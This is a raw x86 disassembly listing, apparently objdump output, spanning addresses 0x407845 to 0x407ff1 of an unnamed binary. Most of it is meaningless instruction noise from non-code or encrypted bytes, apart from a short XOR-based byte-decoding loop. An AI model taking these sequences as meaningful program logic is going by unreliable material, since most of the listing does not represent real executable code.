  407845:	les    esi,FWORD PTR [ebp-0x1f]
  407848:	test   DWORD PTR [ebx],ecx
  40784a:	dec    esp
  40784b:	push   es
  40784c:	retf   0x2527
  40784f:	lods   al,BYTE PTR ds:[esi]
  407850:	inc    ecx
  407851:	sbb    bl,ah
  407853:	jle    0x4077fd
  407855:	sbb    BYTE PTR [edx+0x75cc7775],ch
  40785b:	(bad)  
  40785c:	fcmovne st,st(4)
  40785e:	call   FWORD PTR [eax+eax*1-0x37]
  407862:	(bad)  
  407863:	xor    ebx,DWORD PTR [ecx+eiz*8]
  407866:	stc    
  407867:	mov    WORD PTR [edi-0x907a4de],es
  40786d:	mov    bl,0x72
  40786f:	ins    DWORD PTR es:[edi],dx
  407870:	adc    BYTE PTR [edx-0x37],0x42
  407874:	into   
  407875:	ret    
  407876:	les    eax,FWORD PTR [edx+0x46eae9f]
  40787c:	scas   eax,DWORD PTR es:[edi]
  40787d:	je     0x407845
  40787f:	jb     0x407843
  407881:	arpl   cx,di
  407883:	or     ecx,DWORD PTR [ebp+0xc519c4e]
  407889:	outs   dx,BYTE PTR ds:[esi]
  40788a:	cmp    esp,DWORD PTR [ecx]
  40788c:	dec    ebp
  40788d:	int    0x80
  40788f:	cs mov ebp,0xd1085423
  407895:	inc    ebx
  407896:	adc    BYTE PTR [ebx-0x2e72c3da],ch
  40789c:	jecxz  0x40789c
  40789e:	add    al,0xfd
  4078a1:	ret    
  4078a2:	mov    bl,ch
  4078a4:	cmp    al,bl
  4078a6:	pop    esp
  4078a7:	xchg   esp,eax
  4078a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078a9:	or     edx,esp
  4078ab:	test   BYTE PTR [ebp-0x26179660],ch
  4078b1:	in     eax,dx
  4078b2:	mov    DWORD PTR [ecx+0x57],edx
  4078b5:	clc    
  4078b6:	loope  0x4078b4
  4078b8:	iret   
  4078b9:	pushf  
  4078ba:	cmp    al,0xad
  4078bc:	inc    ebp
  4078bd:	pop    es
  4078be:	jne    0x40792d
  4078c0:	or     eax,0xe1fe9157
  4078c5:	xor    al,0x41
  4078c7:	out    0x64,al
  4078c9:	push   ebp
  4078ca:	aaa    
  4078cb:	clc    
  4078cc:	scas   eax,DWORD PTR es:[edi]
  4078cd:	dec    esp
  4078ce:	adc    al,0xc2
  4078d0:	(bad)  
  4078d1:	loopne 0x4078ab
  4078d3:	cli    
  4078d4:	pop    ebp
  4078d5:	fwait
  4078d6:	inc    ebx
  4078d7:	aas    
  4078d8:	aam    0xbb
  4078da:	mov    ebx,0x1063a162
  4078df:	js     0x40786f
  4078e1:	push   ebx
  4078e2:	and    eax,0x60be9373
  4078e7:	xchg   edx,eax
  4078e8:	fistp  QWORD PTR [edx+0x6f3a4418]
  4078ee:	push   0xffffff9f
  4078f0:	ja     0x4078dd
  4078f2:	nop
  4078f3:	icebp  
  4078f4:	dec    ebp
  4078f5:	cwde   
  4078f6:	ins    DWORD PTR es:[edi],dx
  4078f7:	mov    bl,0x48
  4078f9:	mov    WORD PTR [ebx],ds
  4078fb:	xchg   ebx,eax
  4078fc:	loope  0x407920
  4078fe:	pop    es
  4078ff:	fbld   TBYTE PTR [ebp+0x2]
  407902:	cmp    bh,BYTE PTR [ebx]
  407904:	sub    ah,BYTE PTR [edi+0x57]
  407907:	cld    
  407908:	mov    edx,0x15c9d55e
  40790d:	mov    ebx,0x41e22a1f
  407912:	adc    BYTE PTR [edi],al
  407914:	ja     0x40791e
  407916:	xchg   edi,eax
  407917:	pop    ebp
  407918:	test   eax,0x3733b13
  40791d:	sbb    eax,DWORD PTR [edx]
  40791f:	int    0xc8
  407921:	repnz fild QWORD PTR [ebx+0x7c]
  407925:	scas   al,BYTE PTR es:[edi]
  407926:	xor    DWORD PTR [edi],0xffffffe5
  407929:	add    ecx,0x39
  40792c:	dec    eax
  40792d:	fisub  DWORD PTR [ebp-0x18]
  407930:	mov    cl,0x49
  407932:	mov    dl,0xfa
  407934:	out    dx,eax
  407935:	xor    al,0x55
  407937:	std    
  407938:	mov    dh,0x44
  40793a:	sbb    al,0xc1
  40793c:	jle    0x4078ee
  40793e:	in     al,0xcf
  407940:	mov    bl,0xa
  407942:	aam    0x82
  407944:	push   ebx
  407945:	cwde   
  407946:	(bad)  
  407948:	mov    ah,0x4f
  40794a:	mov    dh,0x21
  40794c:	mov    ds:0x60a8636a,eax
  407951:	loopne 0x4079b7
  407953:	xchg   edx,eax
  407954:	cmp    al,0x2d
  407956:	fstp   QWORD PTR [edi-0x44bbcdfa]
  40795c:	jl     0x40794a
  40795e:	cmp    eax,0x36b81f3f
  407963:	aas    
  407964:	pop    esi
  407965:	inc    esp
  407966:	into   
  407967:	xor    DWORD PTR [ecx-0x71],ebp
  40796a:	inc    eax
  40796b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40796c:	mov    al,bh
  40796e:	shl    DWORD PTR [edx],1
  407970:	xchg   ecx,eax
  407971:	and    BYTE PTR [esi+ebp*8+0x653879e2],0x8
  407979:	and    dl,BYTE PTR [ecx]
  40797b:	loope  0x4078fe
  40797d:	test   eax,0x879dff9b
  407982:	lds    esi,FWORD PTR [edx-0x10463b8f]
  407988:	jnp    0x4079f5
  40798a:	in     eax,dx
  40798b:	lock and al,0x1c
  40798e:	sub    dh,al
  407990:	jne    0x4079fa
  407992:	scas   al,BYTE PTR es:[edi]
  407993:	outs   dx,BYTE PTR ds:[esi]
  407994:	mov    dl,BYTE PTR [ecx+0x21358966]
  40799a:	sbb    BYTE PTR [ebx-0x2dd5daaa],al
  4079a0:	imul   ebx,DWORD PTR [edx+ebp*1-0x7fb387b2],0x68
  4079a8:	push   cs
  4079a9:	in     eax,dx
  4079aa:	xchg   edi,eax
  4079ab:	call   0x4bb0:0x73038ec1
  4079b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079b3:	mov    eax,ds:0x9fe9790f
  4079b8:	push   0xffffff82
  4079ba:	dec    ebp
  4079bb:	push   0x85136f02
  4079c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079c1:	fist   WORD PTR [edx-0x49]
  4079c4:	and    dh,BYTE PTR [esi+0x14d62ece]
  4079ca:	mov    ah,0x31
  4079cc:	addr16 (bad) 
  4079ce:	jecxz  0x4079fe
  4079d0:	(bad)  [ebx-0xe68b41]
  4079d6:	jmp    0x407987
  4079d8:	and    dl,BYTE PTR [ebx]
  4079da:	ins    BYTE PTR es:[edi],dx
  4079db:	mov    esi,DWORD PTR [ebx]
  4079dd:	xor    al,0x19
  4079df:	xor    bh,BYTE PTR [ebx]
  4079e1:	cwde   
  4079e2:	iret   
  4079e3:	jno    0x40798f
  4079e5:	call   0x8c14:0xf846f234
  4079ec:	fisubr DWORD PTR [esi-0x8c79bf5]
  4079f2:	inc    eax
  4079f3:	xchg   edi,eax
  4079f4:	dec    eax
  4079f5:	repz xor edi,ecx
  4079f8:	dec    esp
  4079f9:	cmp    esp,esp
  4079fb:	es jbe 0x407a41
  4079fe:	sbb    edx,DWORD PTR [ecx-0x65a5e6d8]
  407a04:	cld    
  407a05:	push   cs
  407a06:	in     al,dx
  407a07:	fsubr  QWORD PTR [eax-0x29]
  407a0a:	xchg   edi,eax
  407a0b:	pop    ds
  407a0c:	push   esi
  407a0d:	outs   dx,BYTE PTR ds:[esi]
  407a0e:	ret    0x9868
  407a11:	ret    
  407a12:	or     ebx,DWORD PTR [ebx-0x4a]
  407a15:	retf   0xc69
  407a18:	popa   
  407a19:	dec    ebx
  407a1a:	imul   BYTE PTR [eax+edx*4+0x40998487]
  407a21:	mov    al,0xd6
  407a23:	and    dl,BYTE PTR [edx-0x1d48ae1e]
  407a29:	mov    ds:0x5c8c006f,eax
  407a2e:	xor    bh,BYTE PTR [edi+0x6a]
  407a31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a32:	outs   dx,DWORD PTR ds:[esi]
  407a33:	dec    eax
  407a34:	pop    edx
  407a35:	push   fs
  407a37:	push   esp
  407a38:	sahf   
  407a39:	lock (bad) 
  407a3b:	and    BYTE PTR [ebx+0x30],bh
  407a3e:	adc    al,0x62
  407a40:	inc    ebp
  407a41:	mov    ?,ebp
  407a43:	cmc    
  407a44:	push   0x3e
  407a46:	(bad)  
  407a47:	mov    ebp,0xdc90343a
  407a4c:	mov    cs,edi
  407a4e:	loop   0x407a09
  407a50:	fld    TBYTE PTR [ecx]
  407a52:	ret    0xd095
  407a55:	rol    BYTE PTR [edi+0x15],cl
  407a58:	jbe    0x407a81
  407a5a:	mov    ch,0xb1
  407a5c:	sbb    al,0xb4
  407a5e:	jae    0x407a78
  407a60:	inc    ecx
  407a61:	inc    ebp
  407a62:	pop    edx
  407a63:	jmp    0xc00a3472
  407a68:	lahf   
  407a69:	and    al,0x24
  407a6b:	addr16 mov dh,0xbd
  407a6e:	ins    BYTE PTR es:[edi],dx
  407a6f:	(bad)  
  407a70:	in     al,dx
  407a71:	mov    eax,ds:0x8ef4bf36
  407a76:	pop    eax
  407a77:	adc    eax,0x18f3cd7e
  407a7c:	sbb    DWORD PTR [ecx],ebx
  407a7e:	repnz retf 0xe4e3
  407a82:	mov    al,0x9d
  407a84:	out    0x48,al
  407a86:	fist   WORD PTR [eax+0x565580ad]
  407a8c:	jns    0x407af4
  407a8e:	add    eax,edi
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	mov    DWORD PTR [ecx],esp
  407ac2:	mov    esp,0x78db9c9c
  407ac7:	js     0x407b2d
  407ac9:	jle    0x407b43
  407acb:	js     0x407ac4
  407acd:	inc    ebx
  407ace:	in     eax,0x9e
  407ad0:	(bad)  
  407ad1:	inc    ebp
  407ad2:	ins    BYTE PTR es:[edi],dx
  407ad3:	imul   ebp,DWORD PTR [edx-0x594555da],0xffffffd2
  407ada:	iret   
  407adb:	xchg   edi,eax
  407adc:	clc    
  407add:	aas    
  407ade:	jle    0x407aca
  407ae0:	test   eax,0x36c468be
  407ae5:	jle    0x407afc
  407ae7:	sub    DWORD PTR [ebx],0x5d3c94b0
  407aed:	call   0x12d7:0x9120c67e
  407af4:	sub    DWORD PTR [esi],ebp
  407af6:	jg     0x407b22
  407af8:	fwait
  407af9:	push   edi
  407afa:	imul   ecx,ecx,0xffffffa1
  407afd:	add    eax,0x1681e4b5
  407b02:	sar    DWORD PTR [edi],1
  407b04:	jo     0x407aa8
  407b06:	and    ch,BYTE PTR [ebx]
  407b08:	bound  esp,QWORD PTR [edx]
  407b0a:	(bad)  
  407b0b:	ins    DWORD PTR es:[edi],dx
  407b0c:	dec    ebx
  407b0d:	sbb    edx,edi
  407b0f:	cld    
  407b10:	xchg   edi,eax
  407b11:	xchg   edx,eax
  407b12:	icebp  
  407b13:	test   BYTE PTR [edi+eax*8+0x62],bh
  407b17:	cmp    al,BYTE PTR [esi-0x7de6f8b3]
  407b1d:	retf   0x98a0
  407b20:	sbb    al,0xc1
  407b22:	scas   al,BYTE PTR es:[edi]
  407b23:	mov    bh,0x76
  407b25:	add    ebx,DWORD PTR [ebp-0x315187f3]
  407b2b:	fs pop ebp
  407b2d:	or     eax,0x425082ac
  407b32:	jl     0x407ae9
  407b34:	and    al,0x7c
  407b36:	push   esp
  407b37:	stos   DWORD PTR es:[edi],eax
  407b38:	out    dx,al
  407b39:	pop    ebx
  407b3a:	scas   al,BYTE PTR es:[edi]
  407b3b:	sbb    sp,bp
  407b3e:	mov    al,ds:0x72495f77
  407b43:	frstor [ebp+0x217f9c6b]
  407b49:	add    esp,DWORD PTR [ebp+0x5d]
  407b4c:	pop    ebp
  407b4d:	inc    esp
  407b4e:	push   0x2b63ff1a
  407b53:	fdiv   QWORD PTR [ecx+ebx*2]
  407b56:	adc    eax,0x23ba9b36
  407b5b:	test   eax,0x508b41e5
  407b60:	in     al,0x81
  407b62:	pop    ebp
  407b63:	stos   DWORD PTR es:[edi],eax
  407b64:	clc    
  407b65:	ret    0x11d4
  407b68:	push   ecx
  407b69:	inc    DWORD PTR [ebx+0x62]
  407b6c:	std    
  407b6d:	pop    esp
  407b6e:	out    dx,eax
  407b6f:	push   ss
  407b70:	es test eax,0x70b9cdd9
  407b76:	in     al,dx
  407b77:	sub    esp,0x7fa6e1d7
  407b7d:	xlat   BYTE PTR ds:[ebx]
  407b7e:	adc    eax,0xc28924db
  407b83:	sub    al,bl
  407b85:	cld    
  407b86:	test   esi,0x7cf781e2
  407b8c:	mov    DWORD PTR [ecx+0x7e],edx
  407b8f:	xor    edi,DWORD PTR [edx-0x47]
  407b92:	jle    0x407bec
  407b94:	dec    esp
  407b95:	enterw 0x1f50,0x37
  407b9a:	popa   
  407b9b:	in     eax,0x27
  407b9d:	xor    al,0xbf
  407b9f:	jmp    0x407bc5
  407ba1:	fs outs dx,BYTE PTR es:[esi]
  407ba4:	adc    eax,0x8faebd7e
  407ba9:	inc    ecx
  407baa:	shl    DWORD PTR [edi],cl
  407bac:	mov    dl,0xad
  407bae:	mov    bh,0xbd
  407bb0:	fbld   TBYTE PTR [edi+0x3f1a16e5]
  407bb6:	or     ebp,esi
  407bb8:	in     al,0x1c
  407bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bbb:	inc    esi
  407bbc:	daa    
  407bbd:	xchg   esi,eax
  407bbe:	std    
  407bbf:	mov    al,0x74
  407bc1:	les    esp,FWORD PTR [edx-0x58]
  407bc4:	fs int 0x84
  407bc7:	push   esp
  407bc8:	lahf   
  407bc9:	mov    cs:0xd29d1ddf,al
  407bcf:	pop    eax
  407bd0:	jmp    0x600e4ff4
  407bd5:	test   DWORD PTR [eax-0x66],eax
  407bd8:	fwait
  407bd9:	lods   eax,DWORD PTR ds:[esi]
  407bda:	fimul  WORD PTR [eax]
  407bdc:	pop    ebx
  407bdd:	(bad)  
  407bde:	xlat   BYTE PTR ds:[ebx]
  407bdf:	stos   DWORD PTR es:[edi],eax
  407be0:	add    BYTE PTR [ecx+edx*4],al
  407be3:	stos   DWORD PTR es:[edi],eax
  407be4:	jns    0x407c64
  407be6:	arpl   sp,ax
  407be8:	push   eax
  407be9:	clc    
  407bea:	in     eax,dx
  407beb:	mov    WORD PTR [esi-0x35648999],gs
  407bf1:	push   es
  407bf2:	mov    eax,0x256364fa
  407bf7:	inc    ecx
  407bf8:	push   edi
  407bf9:	jno    0x407b98
  407bfb:	loop   0x407c14
  407bfd:	mov    dl,BYTE PTR [ebp+eax*4+0x5773e52e]
  407c04:	jbe    0x407c85
  407c06:	lods   al,BYTE PTR ds:[esi]
  407c07:	mov    fs,WORD PTR [edi]
  407c09:	fnstenv [ebx+0x7e]
  407c0c:	hlt    
  407c0d:	lods   eax,DWORD PTR ds:[esi]
  407c0e:	dec    di
  407c10:	(bad)  
  407c11:	and    eax,DWORD PTR [eax+0x49]
  407c14:	inc    edx
  407c15:	daa    
  407c16:	xor    BYTE PTR [edi-0x6bc80397],dl
  407c1c:	fwait
  407c1d:	adc    esp,DWORD PTR [edx+0x79]
  407c20:	inc    esp
  407c21:	xchg   ebx,eax
  407c22:	fwait
  407c23:	push   0xe6cbde72
  407c28:	mov    dh,BYTE PTR [ecx-0x38a9db8a]
  407c2e:	out    dx,eax
  407c2f:	add    BYTE PTR [edi+0x39],dh
  407c32:	fwait
  407c33:	lds    edx,FWORD PTR [ebx-0x14a87027]
  407c39:	xchg   edi,eax
  407c3a:	pop    edx
  407c3b:	mov    edx,0xe5ac4ea
  407c40:	inc    eax
  407c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c42:	pop    ds
  407c43:	mov    esi,0x56389113
  407c48:	gs jmp 0x6b52:0x187fc387
  407c50:	inc    esp
  407c51:	retf   0x9583
  407c54:	mov    eax,0x1c183db1
  407c5a:	aas    
  407c5b:	pop    eax
  407c5c:	lds    eax,FWORD PTR [edi]
  407c5e:	sahf   
  407c5f:	in     eax,dx
  407c60:	mov    esp,0x26b6902a
  407c65:	imul   cl
  407c67:	je     0x407ca8
  407c69:	repnz loope 0x407c5d
  407c6c:	jl     0x407ca3
  407c6e:	sbb    DWORD PTR [edx],esi
  407c70:	inc    ebx
  407c71:	es xor ecx,eax
  407c74:	cmc    
  407c75:	cs mov bl,0x75
  407c78:	cdq    
  407c79:	jmp    0x407c9d
  407c7b:	cmp    eax,0xf39a90a7
  407c80:	pushf  
  407c81:	push   eax
  407c82:	xchg   ebp,eax
  407c83:	lods   eax,DWORD PTR ds:[esi]
  407c84:	(bad)  
  407c85:	out    dx,al
  407c86:	cmp    cl,ch
  407c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c89:	mov    edx,0x357f54b2
  407c8e:	pop    ds
  407c8f:	shl    DWORD PTR [eax],cl
  407c91:	sub    BYTE PTR [eax-0x258f385c],dh
  407c97:	sub    cl,BYTE PTR [edx+0x2650c85e]
  407c9d:	mov    ch,0x5f
  407c9f:	mov    edi,0x12ce047
  407ca4:	scas   al,BYTE PTR es:[edi]
  407ca5:	mov    ebx,gs
  407ca7:	xor    ah,BYTE PTR [eax+0x47]
  407caa:	sbb    cl,BYTE PTR [edx+0x22]
  407cad:	rcr    DWORD PTR [ebp+0x658c1f0f],cl
  407cb3:	arpl   WORD PTR [eax+0x68],ax
  407cb6:	iret   
  407cb7:	push   edx
  407cb8:	push   es
  407cb9:	mov    eax,ds:0xa2e1d72
  407cbe:	ret    
  407cbf:	push   edx
  407cc0:	sub    edx,esp
  407cc2:	sub    al,0xa4
  407cc4:	inc    eax
  407cc5:	ficomp WORD PTR ds:0x706b424b
  407ccb:	sti    
  407ccc:	mov    ch,0x5b
  407cce:	(bad)  
  407ccf:	jmp    ebp
  407cd1:	sti    
  407cd2:	int3   
  407cd3:	(bad)  
  407cd5:	push   ebp
  407cd6:	or     ebp,DWORD PTR [ebx]
  407cd8:	sbb    edi,DWORD PTR [edx+0x7be4b94e]
  407cde:	ret    0x6571
  407ce1:	xchg   edi,eax
  407ce2:	and    eax,0xa50c1dc8
  407ce7:	or     esi,DWORD PTR [edx]
  407ce9:	jmp    0x4a63:0x2942c554
  407cf0:	mov    edx,ecx
  407cf2:	push   esp
  407cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cf4:	dec    ebx
  407cf5:	fisttp QWORD PTR ds:0x73d198d2
  407cfb:	add    esp,DWORD PTR ds:0x13470213
  407d01:	rcr    ebp,1
  407d03:	lods   al,BYTE PTR ds:[esi]
  407d04:	call   0x4b693fb8
  407d09:	jno    0x407cdb
  407d0b:	xor    BYTE PTR [ebx-0x2],bh
  407d0e:	xor    ch,dl
  407d10:	mov    al,ds:0x851db273
  407d15:	xchg   ecx,eax
  407d16:	stc    
  407d17:	repz mov ebp,0x21284993
  407d1d:	ja     0x407ccf
  407d1f:	data16 adc BYTE PTR [edx-0x6c60646f],al
  407d26:	and    al,0x40
  407d28:	call   0x7ecd:0x3b56028f
  407d2f:	out    0x26,eax
  407d31:	retf   0x2317
  407d34:	and    eax,0x6acae76
  407d39:	jle    0x407da2
  407d3b:	ins    BYTE PTR es:[edi],dx
  407d3c:	retf   0xb1e5
  407d3f:	fwait
  407d40:	jnp    0x407db5
  407d42:	nop
  407d43:	mov    ah,ch
  407d45:	sahf   
  407d46:	retf   
  407d47:	and    ebp,DWORD PTR [esi]
  407d49:	ror    al,cl
  407d4b:	pushf  
  407d4c:	mov    al,cl
  407d4e:	lock lds ebp,FWORD PTR [esi]
  407d51:	add    al,0xba
  407d53:	shl    DWORD PTR [eax+0x7b5acac8],cl
  407d59:	mov    dl,0x47
  407d5b:	ror    DWORD PTR [esi-0x43],cl
  407d5e:	lods   eax,DWORD PTR ds:[esi]
  407d5f:	out    0xe1,al
  407d61:	xor    eax,0x48e387d9
  407d66:	out    dx,al
  407d67:	push   ebx
  407d68:	xchg   BYTE PTR [eax],bl
  407d6a:	mov    al,ds:0xa3941369
  407d6f:	xor    eax,0x83b8e0e1
  407d74:	lea    edx,[edi-0x4f9266dd]
  407d7a:	adc    DWORD PTR [ebp+0x6ed86c71],ecx
  407d80:	in     al,0x91
  407d82:	lods   eax,DWORD PTR ds:[esi]
  407d83:	not    dh
  407d85:	mov    dh,0x7e
  407d87:	mov    edi,0x68ab921
  407d8c:	push   ebp
  407d8d:	sub    DWORD PTR gs:0xcdbe39e8,esp
  407d94:	hlt    
  407d95:	push   ebp
  407d96:	pop    ds
  407d97:	scas   eax,DWORD PTR es:[edi]
  407d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d99:	mov    esi,0xbdb6d1aa
  407d9e:	mov    ebx,0x379251c2
  407da3:	int    0xde
  407da5:	in     eax,0x0
  407da7:	test   eax,0x5c0a5d5f
  407dac:	js     0x407d39
  407dae:	lods   al,BYTE PTR ds:[esi]
  407daf:	arpl   WORD PTR [ecx+0x36bce483],sp
  407db5:	mov    dl,ah
  407db7:	iret   
  407db8:	cmp    edx,eax
  407dba:	jne    0x407772
  407dc0:	pop    edi
  407dc1:	pop    ebx
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fmul   DWORD PTR [ebx-0x77b99f81]
  407dde:	fdivr  DWORD PTR [eax+0x78]
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407e1b
  407de6:	cdq    
  407de7:	test   BYTE PTR [edi+0x5f571c0a],cl
  407ded:	push   ecx
  407dee:	shl    BYTE PTR [eax+0x5cee1167],1
  407df4:	mov    edx,0x9a3a7ad5
  407df9:	inc    esi
  407dfa:	xor    eax,0xce0d3dbb
  407dff:	jb     0x407e09
  407e01:	sahf   
  407e02:	pusha  
  407e03:	inc    edi
  407e04:	lods   al,BYTE PTR ds:[esi]
  407e05:	xor    ah,bl
  407e07:	je     0x407e10
  407e09:	mov    esi,0x6292d0de
  407e0e:	mov    DWORD PTR [eax],0xba05d834
  407e14:	and    DWORD PTR [ebx-0x7e],edi
  407e17:	scas   al,BYTE PTR es:[edi]
  407e18:	cmp    DWORD PTR [ebx],ecx
  407e1a:	jl     0x407e84
  407e1c:	les    ebx,FWORD PTR [ebp+edx*2-0x7c]
  407e20:	clc    
  407e21:	dec    esi
  407e22:	out    0x9f,al
  407e24:	pop    ecx
  407e25:	cs icebp 
  407e27:	jl     0x407ddc
  407e29:	add    al,0x5d
  407e2b:	mov    WORD PTR [edx+0x7d],fs
  407e2e:	mov    WORD PTR [edi+0x5aabbe11],fs
  407e34:	inc    esi
  407e35:	daa    
  407e36:	popf   
  407e37:	popa   
  407e38:	test   al,0x59
  407e3a:	ret    
  407e3b:	cwde   
  407e3c:	inc    esi
  407e3d:	mov    al,ds:0x60c0911b
  407e43:	stc    
  407e44:	cmc    
  407e45:	push   esp
  407e46:	and    ah,ah
  407e48:	shl    ch,cl
  407e4a:	add    BYTE PTR [ebx-0x2389eca7],0x8
  407e51:	idiv   DWORD PTR [esi]
  407e53:	push   edi
  407e54:	mov    dh,0x18
  407e56:	test   DWORD PTR [ecx-0x46],eax
  407e59:	push   0xc
  407e5b:	sbb    dh,BYTE PTR [esi]
  407e5d:	nop
  407e5e:	adc    eax,0xfb1235a
  407e63:	jb     0x407e7a
  407e65:	js     0x407e76
  407e67:	xchg   esp,eax
  407e68:	jp     0x407e45
  407e6a:	lods   al,BYTE PTR ds:[esi]
  407e6b:	cmp    DWORD PTR [edx-0x1920d0bd],0xffffffd9
  407e72:	inc    ecx
  407e73:	jp     0x407e62
  407e75:	data16 fcomp DWORD PTR [esi-0x2a2d6ec1]
  407e7c:	sub    esp,DWORD PTR [edx+0xc]
  407e7f:	mov    edx,DWORD PTR [edx+esi*4-0x48089cbf]
  407e86:	sbb    ebx,eax
  407e88:	push   ebp
  407e89:	push   0x51cad0a1
  407e8e:	xchg   ebp,eax
  407e8f:	xchg   esp,eax
  407e90:	inc    eax
  407e91:	mov    DWORD PTR [edx-0x4af50c4d],esi
  407e97:	scas   eax,DWORD PTR es:[edi]
  407e98:	jecxz  0x407e22
  407e9a:	inc    ebp
  407e9b:	sbb    eax,0x372e6b2f
  407ea0:	mov    esi,0x10ac2e2f
  407ea5:	sbb    BYTE PTR ds:0x6983ce2b,ah
  407eab:	popf   
  407eac:	jecxz  0x407ef0
  407eae:	call   0xbc854cf9
  407eb3:	push   esp
  407eb4:	mov    esi,0xcb304309
  407eb9:	mov    DWORD PTR [edx+0x2fc8c63],0xed1907cb
  407ec3:	add    al,0x8
  407ec5:	shl    DWORD PTR [esi+edx*1-0x79],1
  407ec9:	pop    ebx
  407eca:	ret    
  407ecb:	xor    al,BYTE PTR [edi-0x7e]
  407ece:	adc    DWORD PTR [ecx+0x60b8b342],ebx
  407ed4:	add    eax,0x7ae21afd
  407ed9:	shl    BYTE PTR [edx+ecx*8-0x23],0x13
  407ede:	loop   0x407e64
  407ee0:	ror    DWORD PTR [ebp+ebp*2-0x5a2c8566],1
  407ee7:	add    eax,0x81a79034
  407eec:	cdq    
  407eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eee:	rcl    DWORD PTR [esp+esi*1],cl
  407ef1:	in     eax,dx
  407ef2:	retf   
  407ef3:	xor    eax,0xfde5533c
  407ef8:	cmp    al,0xa2
  407efa:	ficomp WORD PTR [edx-0x2]
  407efd:	adc    ecx,edi
  407eff:	test   eax,0x1623fff5
  407f04:	push   0xf391fba1
  407f09:	inc    eax
  407f0a:	pop    edi
  407f0b:	dec    edi
  407f0c:	sub    DWORD PTR [esi+0x6ba1485f],edx
  407f12:	sbb    al,0x8f
  407f14:	xchg   ebp,eax
  407f15:	outs   dx,DWORD PTR ds:[esi]
  407f16:	cli    
  407f17:	fnstcw WORD PTR [ebx-0x30]
  407f1a:	inc    ebp
  407f1b:	das    
  407f1c:	xor    DWORD PTR [esi-0x49d48286],0x78
  407f23:	and    BYTE PTR [ecx-0x3],dl
  407f26:	sti    
  407f27:	pop    eax
  407f28:	int3   
  407f29:	popf   
  407f2a:	shr    BYTE PTR [edi-0x5b],0x44
  407f2e:	mov    edx,0x714a0bcf
  407f33:	pop    esi
  407f34:	fld    DWORD PTR [ebx]
  407f36:	mov    eax,0x9cff3d23
  407f3b:	cmp    dl,0xd1
  407f3e:	push   edi
  407f3f:	test   al,0x6c
  407f41:	mov    ch,0xb0
  407f43:	dec    ecx
  407f44:	sub    BYTE PTR fs:[edi],ch
  407f47:	rcr    DWORD PTR [ecx+ecx*2],1
  407f4a:	lock mov ah,0x30
  407f4d:	call   0x244ebdb2
  407f52:	or     eax,DWORD PTR [eax-0x45]
  407f55:	cdq    
  407f56:	pop    esi
  407f57:	les    esp,FWORD PTR [esi]
  407f59:	push   esi
  407f5a:	xchg   edx,eax
  407f5b:	daa    
  407f5c:	out    dx,eax
  407f5d:	(bad)  
  407f5e:	mov    dh,0x7c
  407f60:	pop    esp
  407f61:	iret   
  407f62:	dec    ebp
  407f63:	popf   
  407f64:	jmp    0xdd3e39da
  407f69:	xor    dl,al
  407f6b:	das    
  407f6c:	lods   eax,DWORD PTR cs:[esi]
  407f6e:	jne    0x407f97
  407f70:	cmc    
  407f71:	jb     0x407f81
  407f73:	jge    0x407f71
  407f75:	mov    eax,0xa25affb7
  407f7a:	xor    DWORD PTR [ebx+0x2abee1b1],ecx
  407f80:	jno    0x407f02
  407f82:	and    esp,eax
  407f84:	aas    
  407f85:	out    0x0,eax
  407f87:	mov    eax,DWORD PTR [edx]
  407f89:	fs jb  0x407f4b
  407f8c:	cmc    
  407f8d:	pop    ebx
  407f8e:	jg     0x407f67
  407f90:	cld    
  407f91:	cmp    ebx,DWORD PTR [edi+0xe]
  407f94:	sbb    eax,0xd05d9e5e
  407f99:	inc    ebp
  407f9a:	sbb    ah,0xfc
  407f9d:	dec    edx
  407f9e:	repz and BYTE PTR [edi-0x50a002ee],dl
  407fa5:	out    dx,eax
  407fa6:	add    eax,0x578390e9
  407fab:	fcom   DWORD PTR [ebx-0x8c767f4]
  407fb1:	and    bl,bh
  407fb3:	enter  0xccfd,0x42
  407fb7:	fimul  WORD PTR [ecx+eax*1-0x16264ec2]
  407fbe:	cmp    eax,0x8d9a7ce4
  407fc3:	inc    eax
  407fc4:	jne    0x407f5b
  407fc6:	scas   eax,DWORD PTR es:[edi]
  407fc7:	jmp    0xd695ec84
  407fcc:	lds    eax,FWORD PTR es:[ecx]
  407fcf:	jmp    FWORD PTR [eax]
  407fd1:	js     0x408042
  407fd3:	mov    WORD PTR [eax],?
  407fd5:	mov    edi,0x6c6e8b34
  407fda:	adc    eax,0x2dd650d4
  407fdf:	push   ecx
  407fe0:	jmp    0x59dc512a
  407fe5:	scas   eax,DWORD PTR es:[edi]
  407fe6:	jbe    0x407f9f
  407fe8:	and    BYTE PTR [eax-0x4b],bh
  407feb:	adc    esp,DWORD PTR [edi]
  407fed:	sub    al,0xa7
  407fef:	mov    bl,0x28
  407ff1:	in     al,dx
